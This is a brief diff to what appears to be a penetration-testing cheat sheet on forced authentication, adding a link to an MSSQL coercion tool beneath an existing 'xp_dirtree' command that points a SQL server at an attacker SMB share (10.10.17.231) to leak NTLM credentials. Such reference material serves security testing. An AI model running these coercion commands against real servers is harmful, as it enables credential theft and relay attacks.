@@ -87,6 +87,8 @@ C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -S
 EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
 ```
 
+Or use this other technique: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)
+
 ## HTML injection
 
 ### Via email
